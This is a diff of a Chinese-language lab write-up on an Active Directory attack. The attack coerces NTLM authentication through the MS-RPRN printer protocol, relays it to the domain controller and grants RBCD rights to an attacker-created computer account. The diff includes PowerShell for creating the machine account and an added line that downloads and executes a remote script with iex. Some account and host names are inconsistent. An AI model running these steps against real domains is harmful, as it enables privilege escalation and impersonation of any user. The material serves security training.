@@ -33,7 +33,7 @@ WebDav通常預設不會再Sever上安裝，但是Desktop版本的作業系統�
 
 ## Theory
 
-本練習利用微軟MS-RPRN(印表機)協定的設計缺陷，強制AD-01使用Computer account(AD-01$)對AD-01發起NTLM驗證，並將該驗證Relay到AD-DC上，執行RDBC委派(為後續內容)，並讓我們創建的computer account **$evilpc** 對AD-01有RDBC權限，可偽冒 **任意使用者** 使用AD-01上的 **任意服務**
+本練習利用微軟MS-RPRN(印表機)協定的設計缺陷，強制AD-01使用Computer account(AD-01$)對AD-00發起NTLM驗證，並將該驗證Relay到AD-DC上，執行RDBC委派(為後續內容)，並讓我們創建的computer account **$evilpc** 對AD-01有RBCD權限，可偽冒 **任意使用者** 使用AD-01上的 **任意服務**
 
 ### NTLM 驗證
 
@@ -69,12 +69,12 @@ WebDav通常預設不會再Sever上安裝，但是Desktop版本的作業系統�
 
 ### Create a new computer account
 
-為了實作kerberos delegation此處需先創建一個computer account **evilpc**，在實驗六會在詳細解釋原理。
+為了實作kerberos delegation此處需先創建一個computer account **evil-pc**，在實驗六會在詳細解釋原理。
 
 ```powershell
 cd C:\attacker-tools\
 cat -raw .\Powermad.ps1 | iex
-New-MachineAccount -MachineAccount evilpc -Password (ConvertTo-SecureString -String "EvilPassword1" -AsPlainText -Force)
+New-MachineAccount -MachineAccount evil-pc -Password (ConvertTo-SecureString -String "EvilPassword1" -AsPlainText -Force)
 ```
 
 ### Set up a ntlm relay server
@@ -122,7 +122,8 @@ NTLM為一個內嵌的認證協議，實際上可運用在HTTP、LDAP以及SMB�
 [*] evilpc$ can now impersonate users on ADSEC-01$ via S4U2Proxy
 ```
 
-使用 PowerView 可查看 ad-01成功對evil-pc這個computer account授予RBCD權限。
+PowerView 可查看 ad-01成功對evil-pc這個computer account授予RBCD權限。
+
 
 ```powershell
 cat -raw ".\PowerView.ps1" | iex
@@ -131,6 +132,7 @@ Get-DomainComputer ad-01 | select msds-allowedtoactonbehalfofotheridentity
 #取得RBCD的RawData
 $RawBytes = Get-DomainComputer ad-01 | select -expand msds-allowedtoactonbehalfofotheridentity
 
+iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 
 #轉換為 sid
 (New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
